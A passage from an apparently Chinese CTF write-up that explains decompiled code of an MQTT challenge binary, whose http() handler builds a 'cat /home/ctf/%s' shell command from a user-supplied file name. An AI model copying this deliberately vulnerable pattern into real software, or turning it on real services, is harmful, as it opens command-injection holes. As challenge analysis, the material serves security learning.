<span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">    __int64 v8; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">    __int64 v9; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">    <span class="type">char</span> s1[<span class="number">72</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v8 = a1;</span><br><span class="line">    v7 = a2;</span><br><span class="line">    v6 = a3;</span><br><span class="line">    v5 = a4;</span><br><span class="line">    v11 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    v9 = *(_QWORD *)(a4 + <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(v9, <span class="string">&quot;&#123;\&quot;clientid\&quot;:\&quot;%63[^\&quot;]\&quot;,&quot;</span>, s1) == <span class="number">1</span> &amp;&amp; !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;httpclient&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        MQTTClient_freeMessage(&amp;v5);</span><br><span class="line">        MQTTClient_free(v7);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        http(v9);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Message arrived&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;     topic: %s\n&quot;</span>, v7);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   message: %.*s\n&quot;</span>, *(_DWORD *)(v5 + <span class="number">8</span>), *(<span class="type">const</span> <span class="type">char</span> **)(v5 + <span class="number">16</span>));</span><br><span class="line">        MQTTClient_freeMessage(&amp;v5);</span><br><span class="line">        MQTTClient_free(v7);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数 msgarrvd 是我们在上一个 main 函数中看到的 MQTT 接收消息的回调函数，对应 <code>MQTTClient_setCallbacks</code> 中的 msgarrvd</p>
+<p>每当客户端订阅的主题（比如之前的 <code>&quot;HTTP&quot;</code> 主题）收到新消息时，MQTT 底层库就会自动调用这个函数。</p>
+<p>它的核心逻辑是：检查收到的消息，如果是自己（或者标识为 “httpclient” 的设备）发出的 JSON 消息则直接丢弃；如果是其他消息，则交由一个叫 <code>http()</code> 的核心函数去处理并打印出来。</p>
+<h5 id="参数还原与理解"><a href="#参数还原与理解" class="headerlink" title="参数还原与理解"></a>参数还原与理解</h5><p>在 Paho MQTT C 库中，这个回调函数的标准签名其实是这样的：</p>
+<p><code>int msgarrvd(void *context, char *topicName, int topicLen, MQTTClient_message *message)</code></p>
+<p>对应到反编译的伪代码中：</p>
+<ul>
+<li><code>a1</code> (v8) &#x3D; <code>context</code>（上下文指针，这里没用到）</li>
+<li><code>a2</code> (v7) &#x3D; <code>topicName</code>（收到消息的<strong>主题名称</strong>）</li>
+<li><code>a3</code> (v6) &#x3D; <code>topicLen</code>（主题名称的长度）</li>
+<li><code>a4</code> (v5) &#x3D; <code>message</code>（指向 <code>MQTTClient_message</code> 结构体的<strong>消息对象指针</strong>）</li>
+</ul>
+<h5 id="提取消息内容"><a href="#提取消息内容" class="headerlink" title="提取消息内容"></a>提取消息内容</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v9 = *(_QWORD *)(a4 + <span class="number">16</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在 64 位系统中，<code>MQTTClient_message</code> 结构体偏移 16 字节（<code>a4 + 16</code>）的位置存放的是 <code>payload</code>，也就是真正的消息内容（字符串或二进制数据）。</p>
+<p>这一步将消息内容的指针赋给了 <code>v9</code>。</p>
+<h5 id="消息过滤（if-分支）"><a href="#消息过滤（if-分支）" class="headerlink" title="消息过滤（if 分支）"></a>消息过滤（if 分支）</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(v9, <span class="string">&quot;&#123;\&quot;clientid\&quot;:\&quot;%63[^\&quot;]\&quot;,&quot;</span>, s1) == <span class="number">1</span> &amp;&amp; !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;httpclient&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    MQTTClient_freeMessage(&amp;v5);</span><br><span class="line">    MQTTClient_free(v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>解析 JSON</strong>：使用 <code>sscanf</code> 尝试按照特定的 JSON 格式解析收到的消息 <code>v9</code>。它在寻找 <code>{&quot;clientid&quot;:&quot;</code> 开头的内容，并把双引号里面的字符串提取到字符数组 <code>s1</code> 中（最多提取 63 个字符）。</li>
+<li>****如果成功提取到了 <code>clientid</code>，并且 <code>strcmp</code> 比较发现这个 ID 刚好是 <code>&quot;httpclient&quot;</code>。</li>
+<li>满足上述条件说明这是自己发出的消息，或者是伪造成自己发出的消息。程序会调用释放内存的函数，清理消息体和主题字符串，然后直接 return 1 结束处理，不做任何额外动作。</li>
+<li>这种设计通常是为了防止回音现象（自己订阅了主题，又往这个主题发消息，导致自己收到自己的消息）。</li>
+</ul>
+<h5 id="处理其他消息（else-分支）"><a href="#处理其他消息（else-分支）" class="headerlink" title="处理其他消息（else 分支）"></a>处理其他消息（else 分支）</h5><p>如果消息格式不匹配，或者 <code>clientid</code> 不是 <code>&quot;httpclient&quot;</code>，程序就会进入 <code>else</code> 分支：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    http(v9);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Message arrived&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     topic: %s\n&quot;</span>, v7);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   message: %.*s\n&quot;</span>, *(_DWORD *)(v5 + <span class="number">8</span>), *(<span class="type">const</span> <span class="type">char</span> **)(v5 + <span class="number">16</span>));</span><br><span class="line">    MQTTClient_freeMessage(&amp;v5);</span><br><span class="line">    MQTTClient_free(v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>程序将收到的消息内容（<code>v9</code>）原封不动地传给了一个名为 <code>http()</code> 的函数。这是一个自定义函数，整个程序真正的核心业务逻辑大概率就在这个 <code>http()</code> 函数里面。</li>
+<li>打印日志：<ul>
+<li>打印主题名称：<code>topic: [主题名]</code></li>
+<li>打印消息内容：<code>printf</code> 中的 <code>%.*s</code> 是一个 C 语言的高级用法，它会根据前面的参数指定打印长度。这里 <code>*(_DWORD *)(v5 + 8)</code> 获取的是 <code>payloadlen</code>（消息长度），<code>*(const char )(v5 + 16)</code> 是 <code>payload</code>（消息内容），合起来就是精确地打印出收到的所有内容。</li>
+</ul>
+</li>
+<li>清理内存：同样释放消息体和主题占用的内存。</li>
+<li>返回 1：告诉 MQTT 库，这条消息已经被成功接收并处理完了。</li>
+</ul>
+<p>所有非自身的 MQTT 消息输入，最终都交给了 <code>http()</code> 处理。所以我们主要分析的应该是 http 函数当中是否存在一定的漏洞：</p>
+<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">http</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [rsp+10h] [rbp-280h] BYREF</span></span><br><span class="line">    <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-27Ch]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-278h]</span></span><br><span class="line">    <span class="type">int</span> v7; <span class="comment">// [rsp+1Ch] [rbp-274h]</span></span><br><span class="line">    FILE *stream; <span class="comment">// [rsp+20h] [rbp-270h]</span></span><br><span class="line">    <span class="type">char</span> *v9; <span class="comment">// [rsp+28h] [rbp-268h]</span></span><br><span class="line">    <span class="type">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-260h] BYREF</span></span><br><span class="line">    __int64 v11; <span class="comment">// [rsp+38h] [rbp-258h]</span></span><br><span class="line">    __int64 v12; <span class="comment">// [rsp+40h] [rbp-250h]</span></span><br><span class="line">    __int64 v13; <span class="comment">// [rsp+48h] [rbp-248h]</span></span><br><span class="line">    __int64 v14; <span class="comment">// [rsp+50h] [rbp-240h]</span></span><br><span class="line">    __int64 v15; <span class="comment">// [rsp+58h] [rbp-238h]</span></span><br><span class="line">    __int64 v16; <span class="comment">// [rsp+60h] [rbp-230h]</span></span><br><span class="line">    __int64 v17; <span class="comment">// [rsp+68h] [rbp-228h]</span></span><br><span class="line">    <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+70h] [rbp-220h] BYREF</span></span><br><span class="line">    __int64 v19; <span class="comment">// [rsp+78h] [rbp-218h]</span></span><br><span class="line">    __int64 v20; <span class="comment">// [rsp+80h] [rbp-210h]</span></span><br><span class="line">    __int64 v21; <span class="comment">// [rsp+88h] [rbp-208h]</span></span><br><span class="line">    __int64 v22; <span class="comment">// [rsp+90h] [rbp-200h]</span></span><br><span class="line">    __int64 v23; <span class="comment">// [rsp+98h] [rbp-1F8h]</span></span><br><span class="line">    __int64 v24; <span class="comment">// [rsp+A0h] [rbp-1F0h]</span></span><br><span class="line">    __int64 v25; <span class="comment">// [rsp+A8h] [rbp-1E8h]</span></span><br><span class="line">    __int64 v26; <span class="comment">// [rsp+B0h] [rbp-1E0h]</span></span><br><span class="line">    __int64 v27; <span class="comment">// [rsp+B8h] [rbp-1D8h]</span></span><br><span class="line">    __int64 v28; <span class="comment">// [rsp+C0h] [rbp-1D0h]</span></span><br><span class="line">    __int64 v29; <span class="comment">// [rsp+C8h] [rbp-1C8h]</span></span><br><span class="line">    __int64 v30; <span class="comment">// [rsp+D0h] [rbp-1C0h]</span></span><br><span class="line">    __int64 v31; <span class="comment">// [rsp+D8h] [rbp-1B8h]</span></span><br><span class="line">    __int64 v32; <span class="comment">// [rsp+E0h] [rbp-1B0h]</span></span><br><span class="line">    __int64 v33; <span class="comment">// [rsp+E8h] [rbp-1A8h]</span></span><br><span class="line">    <span class="type">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+F0h] [rbp-1A0h] BYREF</span></span><br><span class="line">    __int64 v35; <span class="comment">// [rsp+F8h] [rbp-198h]</span></span><br><span class="line">    __int64 v36; <span class="comment">// [rsp+100h] [rbp-190h]</span></span><br><span class="line">    __int64 v37; <span class="comment">// [rsp+108h] [rbp-188h]</span></span><br><span class="line">    __int64 v38; <span class="comment">// [rsp+110h] [rbp-180h]</span></span><br><span class="line">    __int64 v39; <span class="comment">// [rsp+118h] [rbp-178h]</span></span><br><span class="line">    __int64 v40; <span class="comment">// [rsp+120h] [rbp-170h]</span></span><br><span class="line">    __int64 v41; <span class="comment">// [rsp+128h] [rbp-168h]</span></span><br><span class="line">    __int64 v42; <span class="comment">// [rsp+130h] [rbp-160h]</span></span><br><span class="line">    __int64 v43; <span class="comment">// [rsp+138h] [rbp-158h]</span></span><br><span class="line">    __int64 v44; <span class="comment">// [rsp+140h] [rbp-150h]</span></span><br><span class="line">    __int64 v45; <span class="comment">// [rsp+148h] [rbp-148h]</span></span><br><span class="line">    __int64 v46; <span class="comment">// [rsp+150h] [rbp-140h]</span></span><br><span class="line">    __int64 v47; <span class="comment">// [rsp+158h] [rbp-138h]</span></span><br><span class="line">    __int64 v48; <span class="comment">// [rsp+160h] [rbp-130h]</span></span><br><span class="line">    __int64 v49; <span class="comment">// [rsp+168h] [rbp-128h]</span></span><br><span class="line">    <span class="type">char</span> v50[<span class="number">8</span>]; <span class="comment">// [rsp+170h] [rbp-120h] BYREF</span></span><br><span class="line">    __int64 v51; <span class="comment">// [rsp+178h] [rbp-118h]</span></span><br><span class="line">    __int64 v52; <span class="comment">// [rsp+180h] [rbp-110h]</span></span><br><span class="line">    __int64 v53; <span class="comment">// [rsp+188h] [rbp-108h]</span></span><br><span class="line">    __int64 v54; <span class="comment">// [rsp+190h] [rbp-100h]</span></span><br><span class="line">    __int64 v55; <span class="comment">// [rsp+198h] [rbp-F8h]</span></span><br><span class="line">    __int64 v56; <span class="comment">// [rsp+1A0h] [rbp-F0h]</span></span><br><span class="line">    __int64 v57; <span class="comment">// [rsp+1A8h] [rbp-E8h]</span></span><br><span class="line">    __int64 v58; <span class="comment">// [rsp+1B0h] [rbp-E0h]</span></span><br><span class="line">    __int64 v59; <span class="comment">// [rsp+1B8h] [rbp-D8h]</span></span><br><span class="line">    __int64 v60; <span class="comment">// [rsp+1C0h] [rbp-D0h]</span></span><br><span class="line">    __int64 v61; <span class="comment">// [rsp+1C8h] [rbp-C8h]</span></span><br><span class="line">    __int64 v62; <span class="comment">// [rsp+1D0h] [rbp-C0h]</span></span><br><span class="line">    __int64 v63; <span class="comment">// [rsp+1D8h] [rbp-B8h]</span></span><br><span class="line">    __int64 v64; <span class="comment">// [rsp+1E0h] [rbp-B0h]</span></span><br><span class="line">    __int64 v65; <span class="comment">// [rsp+1E8h] [rbp-A8h]</span></span><br><span class="line">    __int64 v66; <span class="comment">// [rsp+1F0h] [rbp-A0h]</span></span><br><span class="line">    __int64 v67; <span class="comment">// [rsp+1F8h] [rbp-98h]</span></span><br><span class="line">    __int64 v68; <span class="comment">// [rsp+200h] [rbp-90h]</span></span><br><span class="line">    __int64 v69; <span class="comment">// [rsp+208h] [rbp-88h]</span></span><br><span class="line">    __int64 v70; <span class="comment">// [rsp+210h] [rbp-80h]</span></span><br><span class="line">    __int64 v71; <span class="comment">// [rsp+218h] [rbp-78h]</span></span><br><span class="line">    __int64 v72; <span class="comment">// [rsp+220h] [rbp-70h]</span></span><br><span class="line">    __int64 v73; <span class="comment">// [rsp+228h] [rbp-68h]</span></span><br><span class="line">    __int64 v74; <span class="comment">// [rsp+230h] [rbp-60h]</span></span><br><span class="line">    __int64 v75; <span class="comment">// [rsp+238h] [rbp-58h]</span></span><br><span class="line">    __int64 v76; <span class="comment">// [rsp+240h] [rbp-50h]</span></span><br><span class="line">    __int64 v77; <span class="comment">// [rsp+248h] [rbp-48h]</span></span><br><span class="line">    __int64 v78; <span class="comment">// [rsp+250h] [rbp-40h]</span></span><br><span class="line">    __int64 v79; <span class="comment">// [rsp+258h] [rbp-38h]</span></span><br><span class="line">    __int64 v80; <span class="comment">// [rsp+260h] [rbp-30h]</span></span><br><span class="line">    __int64 v81; <span class="comment">// [rsp+268h] [rbp-28h]</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v82; <span class="comment">// [rsp+278h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    v82 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    *(_QWORD *)s1 = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v14 = <span class="number">0</span>;</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    *(_QWORD *)s = <span class="number">0</span>;</span><br><span class="line">    v19 = <span class="number">0</span>;</span><br><span class="line">    v20 = <span class="number">0</span>;</span><br><span class="line">    v21 = <span class="number">0</span>;</span><br><span class="line">    v22 = <span class="number">0</span>;</span><br><span class="line">    v23 = <span class="number">0</span>;</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">    v25 = <span class="number">0</span>;</span><br><span class="line">    *(_QWORD *)src = <span class="number">0</span>;</span><br><span class="line">    v35 = <span class="number">0</span>;</span><br><span class="line">    v36 = <span class="number">0</span>;</span><br><span class="line">    v37 = <span class="number">0</span>;</span><br><span class="line">    v38 = <span class="number">0</span>;</span><br><span class="line">    v39 = <span class="number">0</span>;</span><br><span class="line">    v40 = <span class="number">0</span>;</span><br><span class="line">    v41 = <span class="number">0</span>;</span><br><span class="line">    v42 = <span class="number">0</span>;</span><br><span class="line">    v43 = <span class="number">0</span>;</span><br><span class="line">    v44 = <span class="number">0</span>;</span><br><span class="line">    v45 = <span class="number">0</span>;</span><br><span class="line">    v46 = <span class="number">0</span>;</span><br><span class="line">    v47 = <span class="number">0</span>;</span><br><span class="line">    v48 = <span class="number">0</span>;</span><br><span class="line">    v49 = <span class="number">0</span>;</span><br><span class="line">    v26 = <span class="number">0</span>;</span><br><span class="line">    v27 = <span class="number">0</span>;</span><br><span class="line">    v28 = <span class="number">0</span>;</span><br><span class="line">    v29 = <span class="number">0</span>;</span><br><span class="line">    v30 = <span class="number">0</span>;</span><br><span class="line">    v31 = <span class="number">0</span>;</span><br><span class="line">    v32 = <span class="number">0</span>;</span><br><span class="line">    v33 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    stream = <span class="number">0</span>;</span><br><span class="line">    *(_QWORD *)v50 = <span class="number">0</span>;</span><br><span class="line">    v51 = <span class="number">0</span>;</span><br><span class="line">    v52 = <span class="number">0</span>;</span><br><span class="line">    v53 = <span class="number">0</span>;</span><br><span class="line">    v54 = <span class="number">0</span>;</span><br><span class="line">    v55 = <span class="number">0</span>;</span><br><span class="line">    v56 = <span class="number">0</span>;</span><br><span class="line">    v57 = <span class="number">0</span>;</span><br><span class="line">    v58 = <span class="number">0</span>;</span><br><span class="line">    v59 = <span class="number">0</span>;</span><br><span class="line">    v60 = <span class="number">0</span>;</span><br><span class="line">    v61 = <span class="number">0</span>;</span><br><span class="line">    v62 = <span class="number">0</span>;</span><br><span class="line">    v63 = <span class="number">0</span>;</span><br><span class="line">    v64 = <span class="number">0</span>;</span><br><span class="line">    v65 = <span class="number">0</span>;</span><br><span class="line">    v66 = <span class="number">0</span>;</span><br><span class="line">    v67 = <span class="number">0</span>;</span><br><span class="line">    v68 = <span class="number">0</span>;</span><br><span class="line">    v69 = <span class="number">0</span>;</span><br><span class="line">    v70 = <span class="number">0</span>;</span><br><span class="line">    v71 = <span class="number">0</span>;</span><br><span class="line">    v72 = <span class="number">0</span>;</span><br><span class="line">    v73 = <span class="number">0</span>;</span><br><span class="line">    v74 = <span class="number">0</span>;</span><br><span class="line">    v75 = <span class="number">0</span>;</span><br><span class="line">    v76 = <span class="number">0</span>;</span><br><span class="line">    v77 = <span class="number">0</span>;</span><br><span class="line">    v78 = <span class="number">0</span>;</span><br><span class="line">    v79 = <span class="number">0</span>;</span><br><span class="line">    v80 = <span class="number">0</span>;</span><br><span class="line">    v81 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;&#123;\&quot;clientid\&quot;:\&quot;%63[^\&quot;]\&quot;&quot;</span>, s1) == <span class="number">1</span> &amp;&amp; !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;httpclient&quot;</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;GET /home/ctf/%63[^ \&quot;\r\n/]&quot;</span>, s) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;GET %*[^/]/ctf/%63[^ \&quot;\r\n/]&quot;</span>, s) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;GET %*s/ctf/\&quot;%63[^\&quot;]\&quot;&quot;</span>, s) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">&quot;/ctf/&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        v9 = <span class="built_in">strstr</span>(a1, <span class="string">&quot;/ctf/&quot;</span>) + <span class="number">5</span>;</span><br><span class="line">        __isoc99_sscanf(v9, <span class="string">&quot;%63[^ \&quot;\r\n/]&quot;</span>, s);</span><br><span class="line">        v5 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;GET %*s HTTP/1.1\r\nHost: %*s\r\nContentLength: %d\r\n&quot;</span>, &amp;v4) == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;find length: %d\n&quot;</span>, v4);</span><br><span class="line">            v2 = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="keyword">if</span> ( v2 &gt; v4 )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;file name length exceeds contentlength&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v4 &gt; <span class="number">10</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;contentlength too long&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;ContentLength not found&quot;</span>);</span><br><span class="line">            v5 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = i;</span><br><span class="line">            <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ( s[i] == <span class="number">47</span> || s[i] == <span class="number">46</span> )</span><br><span class="line">                s[i] = <span class="number">95</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">snprintf</span>(src, <span class="number">0x80u</span>, <span class="string">&quot;cat /home/ctf/%s&quot;</span>, s);</span><br><span class="line">        v7 = <span 